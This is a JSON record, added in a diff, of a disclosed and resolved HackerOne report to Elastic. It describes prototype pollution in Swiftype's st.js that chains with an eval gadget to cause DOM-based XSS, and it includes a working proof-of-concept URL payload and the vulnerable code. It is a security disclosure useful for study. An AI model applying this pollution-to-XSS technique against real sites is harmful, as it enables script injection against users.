@@ -1,0 +1,216 @@
+{
+  "id": 998398,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85OTgzOTg=",
+  "url": "https://hackerone.com/reports/998398",
+  "title": "Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-10-05T13:36:28.671Z",
+  "submitted_at": "2020-10-05T13:36:29.292Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "s1r1u5",
+    "url": "/s1r1u5",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6NqjjWVeuBun4Voc9bJVpTSp/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23607,
+    "url": "https://hackerone.com/elastic",
+    "handle": "elastic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Elastic",
+      "twitter_handle": "elastic",
+      "website": "https://www.elastic.co/",
+      "about": "Smarter search. Stronger security. Seamless observability. Uncover real-time insights with Search AI."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-08-16T18:54:38.948Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-08-16T18:19:42.270Z",
+  "team_member_agreed_on_going_public_at": "2021-08-16T18:54:38.774Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \ndeparam function which parses location.hash in https://s.swiftypecdn.com/install/v2/st.js  is vulnerable to prototype pollution.\nThere is a script gadget in the same js file which leads to XSS.\n\n\n## Steps To Reproduce:\nVisit (Refresh if you don't see a pop up)\nhttps://blog.swiftype.com/#__proto__[asd]=alert(document.domain)\n\n## Root Cause\nhttps://s.swiftypecdn.com/install/v2/st.js is the vulnerable file.\ndeparam function parses the ` location.hash` incorrectly which leads to Prototype Pollution.\n\n```\n\n t.deparam = h = function(e, n) {\n            var i = {}\n              , r = {\n                \"true\": !0,\n                \"false\": !1,\n                \"null\": null\n            };\n            return t.each(e.replace(/\\+/g, \" \").split(\"&\"), function(e, o) {\n                var s, a = o.split(\"=\"), u = b(a[0]), c = i, h = 0, p = u.split(\"][\"), f = p.length - 1;\n                if (/\\[/.test(p[0]) && /\\]$/.test(p[f]) ? (p[f] = p[f].replace(/\\]$/, \"\"),\n                p = p.shift().split(\"[\").concat(p),\n                f = p.length - 1) : f = 0,\n                2 === a.length)\n                    if (s = b(a[1]),\n                    n && (s = s && !isNaN(s) ? +s : \"undefined\" === s ? l : r[s] !== l ? r[s] : s),\n                    f)\n                        for (; h <= f; h++)\n                            u = \"\" === p[h] ? c.length : p[h],\n                            c = c[u] = h < f ? c[u] || (p[h + 1] && isNaN(p[h + 1]) ? {} : []) : s; //pollution here\n                    else\n                        t.isArray(i[u]) ? i[u].push(s) : i[u] !== l ? i[u] = [i[u], s] : i[u] = s;\n                else\n                    u && (i[u] = n ? l : \"\")\n            }),\n            i\n        }\n\n```\n\nGadget found in the same js, which is very interesting gadget I found so far :xD\n\n```\n\n    \n        pInstall._convertStringHooksToFunctions = function() {\n            var functionHooks = {};\n            $.each(this._userServerConfiguration.install.hooks, function(hookName, hookFunction) {\n                functionHooks[hookName] = eval(hookFunction) //eval everything in the object\n            }),\n            this._userServerConfiguration.install.hooks = functionHooks\n        }\n        \n\n```\n\n## Impact: \nXSS\n\n## Impact\n\nXSS",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-09-15T18:19:42.352Z",
+  "allow_singular_disclosure_after": -151330374.4076996,
+  "singular_disclosure_allowed": true,
+  "vote_count": 156,
+  "voters": [
+    "bochen",
+    "buraaqsec",
+    "taha",
+    "arist0phanes",
+    "orange303",
+    "0xben10",
+    "achabi7",
+    "wi11",
+    "m3ss1_neo",
+    "scarecow",
+    "and 146 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 5807,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.swiftype.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "998398",
+  "votes": 156,
+  "latest_disclosable_activity_at": "2021-08-16T18:54:39.010Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T14:32:36.862053",
+    "source": "https://hackerone.com/reports/998398.json",
+    "report_id": 998398
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85OTgzOTg=",
+    "databaseId": "998398",
+    "title": "Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)",
+    "url": "https://hackerone.com/reports/998398",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2021-08-16T18:54:38.948Z",
+    "created_at": "2020-10-05T13:36:28.671Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYz",
+      "name": "Cross-site Scripting (XSS) - DOM",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "s1r1u5"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzNjA3",
+      "handle": "elastic",
+      "name": "Elastic",
+      "url": "https://hackerone.com/elastic",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yNDk2MTA=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-10-06T18:37:58.992Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yNDk5MTc=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-10-07T16:43:54.919Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yNTA0MDA=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-10-09T03:37:03.259Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzk5ODM5OA==",
+    "_id": "998398",
+    "disclosed": true,
+    "votes": 156,
+    "latest_disclosable_activity_at": "2021-08-16T18:54:39.010Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85OTgzOTg=",
+      "databaseId": "998398",
+      "title": "Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)",
+      "url": "https://hackerone.com/reports/998398",
+      "disclosed_at": "2021-08-16T18:54:38.948Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzNjA3",
+      "handle": "elastic",
+      "name": "Elastic",
+      "url": "https://hackerone.com/elastic",
+      "currency": "usd"
+    }
+  }
+}
